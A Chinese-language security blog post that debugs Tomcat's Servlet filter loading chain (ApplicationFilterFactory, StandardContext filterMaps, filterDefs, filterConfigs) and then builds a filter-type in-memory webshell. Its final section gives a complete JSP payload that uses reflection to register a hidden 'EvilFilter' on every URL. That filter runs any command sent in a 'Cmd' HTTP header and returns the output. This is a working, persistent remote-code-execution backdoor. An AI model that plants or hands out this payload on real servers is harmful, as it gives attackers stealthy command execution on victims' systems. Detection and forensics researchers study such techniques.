---
title: "Tomcat Filter 型内存马分析"
date: 2022-11-05T12:14:32+08:00
lastmod: 2022-11-05T12:14:32+08:00
draft: false
author: "X1r0z"

tags: ['java安全']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

Tomcat Filter 型内存马

<!--more-->

## Filter 加载流程

关于 Servlet Filter 的相关概念在前一篇文章已经讲过, 这里不再赘述

下面通过调试一个简单的 demo 来跟踪 filter 在 tomcat 中的加载流程

修改 pom.xml 添加如下 package

```xml
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.82</version>
</dependency>
```

编写 TestFilter

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.annotation.*;
import java.io.IOException;

@WebFilter(filterName = "TestFilter", urlPatterns = "/*")
public class TestFilter implements Filter {
    public void init(FilterConfig config) throws ServletException {
    }

    public void destroy() {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
        System.out.println("filter");
        chain.doFilter(request, response);
    }
}
```

在 doFilter 方法中下断点

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042022442.png)

调用栈

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042024305.png)

直接跳转到 StandardWrapperValve, 再往前就偏底层了

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042026953.png)

执行了 filterChain.doFilter 方法, 继续跟进

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042028133.png)

在 doFilter 内会检测 jvm 是否开启了安全模式, 然后继续执行 this.internalDoFilter 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042029171.png)



internalDoFilter 会从 this.filters 数组中依次取出 filterConfig 对象, 然后通过 filterConfig.getFilter() 得到 Filter 实例, 最后调用其 doFilter 方法

这里我跳过了 tomcat 自带的 ws filter, 因此第二次得到的 Filter 就是之前编写的 TestFilter

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042033512.png)

再往下就不继续调试了

然后我们回到 StandardWrapperValve, 往前面翻翻看这个 filterChain 是怎么来的

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042027120.png)

这里通过 ApplicationFilterFactory.createFilterChain() 创建 filterChain

需要注意创建过程是动态的, 即我们每发起一次请求, tomcat 都会执行一遍 createFilterChain, 这也为后面内存马的植入做了铺垫

跟进 createFilterChain 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042040708.png)

首先从 Request 对象中获取 filterChain, 如果 filterChain 不存在, 就自己新建一个, 再设置到 req 内

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042043731.png)

然后从 wrapper 中获取 StandardContext 对象, 并且调用 findFilterMaps 方法得到 filterMaps

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042045782.png)

最后遍历 filterMaps, 通过 filterMap.getFilterName() 从 context 中寻找对应的 FilterConfig 并且添加至 filterChain

这里与 StandardContext 相关的有两个方法: findFilterMaps 和 findFilterConfig, 可以说这两个方法决定了我们的 Filter 能否成功添加到至 filterChain 并被调用

先跟进 findFilterMaps 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042050136.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042050340.png)

filterMaps 是 ContextFilterMaps 的实例, 后者相当于一个 Array

继续搜索与 FilterMap 相关的其它方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042053563.png)

通过 addfilterMap 和 addFilterMapBefore 这两个方法可以向 filterMaps 中添加 FilterMap

其中注意 validateFilterMap

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042113598.png)

该方法会对传入的 FilterMap 进行验证, 如果 this.findFilterDef 的返回值为 null 则会抛出异常

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042114616.png)

这里的 filterDefs 在上面已经给出, 本质也是一个 HashMap, 并且存在 addFilterDef 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042115838.png)

下面再看一下 FilterMap 的定义

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042056664.png)

其内部存在 filterName 和 urlPatterns 属性, 分别对应之前的 getFilterName 和 `@WebFilter` 注解中的 urlPatterns

接着再跟进 StandardContext 的 findFilterConfig 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042059243.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042059491.png)

filterConfigs 的本质也是 HashMap

但在 StandardContext 中涉及到对 filterConfigs 操作的只有 filterStart 和 filterStop 方法, 而两者仅在 tomcat 启动和停止时被调用, 因此我们在运行时只能通过反射的方式修改 filterConfigs

不过仍然可以看看 filterStart 是怎么初始化 filterConfigs 的

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042101997.png)

方法内部遍历了 this.filterDefs 并且以 context 和 filterDef 为参数实例化 ApplicationFilterConfig 作为 filterConfig, 然后将其放入 filterConfigs

继续看 ApplicationFilterConfig 的定义

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042107506.png)

内部存在 filterDef 和 filter 属性, 前者通过构造方法赋值, 并且调用其 getFilter 方法来获取 Filter 实例, 然后赋值给后者

FilterDef 的定义

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042109461.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211042109373.png)

重点关注 filter filterClass filterName 这三个属性

filter 是被调用 Filter 实例, filterClass 是 Filter 对应的 Class, filterName 就是 Filter 的名称, 而且三者都有对应的 getter 和 setter

综上, Filter 的加载流程如下

1. 通过 ApplicationFilterFactory.createFilterChain() 创建 FilterChain
2. 调用 StandardContext.findFilterMaps() 得到 filterMaps
3. 遍历 filterMaps, 依次从 StandardContext 中用 filterMap.getFilterName()  获取对应的 filterConfig, 并将其放入 FilterChain
4. 执行 FilterChain.doFilter() 并在内部调用 internalDoFilter 方法
5. 依次执行 filterConfig.getFilter() 获取 Filter 实例, 并最终调用其 doFilter 方法

## Filter 相关对象和属性

在编写内存马之前, 我们先梳理一下之前出现的各种以 Filter 开头的对象

- FilterMap: 存在 filterName 和 urlPatterns 属性, 对应 Filter 的名称和匹配规则

- FilterConfig: 这里具体指 ApplicationFilterConfig, 存在 Filter 和 FilterDef 属性, 其中 Filter 在构造函数中通过 filterDef.getFilter() 取得

- FilterDef: 存在 filter filterClass filterName 属性, 其中 filter 为被调用的 Filter 实例

然后是位于 StandardContext 中的以 filter 开头的属性

- filterMaps: 本质为 Array, 存放 FilterMap

- filterConfigs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterConfig

- filterDefs: 本质为 HashMap, key 为 filterMap 的 filterName, value 为对应的 FilterDef

根据上面加载流程, 我们注入内存马的过程为

1. 在 StandardContext 的 filterDefs 中添加 FilterDef (validateFilterMap 验证))
2. 向 filterMaps 中添加 FilterMap
3. 将对应的 FilterConfig (包含 FilterDef) 添加到 filterConfigs

## 编写内存马

前面分析的已经很明显了, 但这里还有一个问题, 如何获取 StandardContext?

方法很多, 可以从 request 获取, 也可以从 ContextClassLoader ThreadLocal MBean 中获取

因为 JSP 默认就可以调用 request 对象, 所以下面先以 request 为例, 后面的几种方法等有时间专门写一篇文章

最终 payload 如下

```java
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.io.*" %>
<%

    // 获取 StandardContext
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctxField = servletContext.getClass().getDeclaredField("context");
    appctxField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctxField.get(servletContext);
    Field stdctxField = applicationContext.getClass().getDeclaredField("context");
    stdctxField.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctxField.get(applicationContext);

    // 获取 FilterConfigs
    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigsField.setAccessible(true);
    Map filterConfigs = (Map) filterConfigsField.get(standardContext);

    // 编写 Filter
    String filterName = "EvilFilter";

    if (filterConfigs.get(filterName) == null){
        // 这里使用了匿名类的形式来定义 Filter
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void destroy() {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
                PrintWriter pw = servletResponse.getWriter();
                String cmd = httpServletRequest.getHeader("Cmd");
                if (cmd != null){
                    Process process = Runtime.getRuntime().exec(cmd);
                    InputStream input = process.getInputStream();
                    BufferedReader br = new BufferedReader(new InputStreamReader(input));
                    String line = null;
                    while ((line = br.readLine()) != null){
                        pw.write(line);
                    }
                    br.close();
                    input.close();
                    pw.write("\n");
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }
        };

        // 创建 FilterDef
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(filter.getClass().getName());
        filterDef.setFilter(filter);

        // 添加 FilterDef
        standardContext.addFilterDef(filterDef);

        // 创建 FilterMap
        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName(filterName);
        filterMap.addURLPattern("/*");
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        // 添加 FilterMap 到首位
        standardContext.addFilterMapBefore(filterMap);

        // 因为 ApplicationFilterConfig 的构造方法是不带 public 的, 即默认的作用域为 package, 所以我们需要通过反射来实例化该对象
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
        filterConfigs.put(filterName, applicationFilterConfig);

        out.print("inject success");
    }
%>
```

保存为 test.jsp

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211051210084.png)

最后携带 Cmd header 访问任意页面

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211051211226.png)

成功执行命令

## 参考文章

[https://xz.aliyun.com/t/10362](https://xz.aliyun.com/t/10362)

[http://wjlshare.com/archives/1529](http://wjlshare.com/archives/1529)
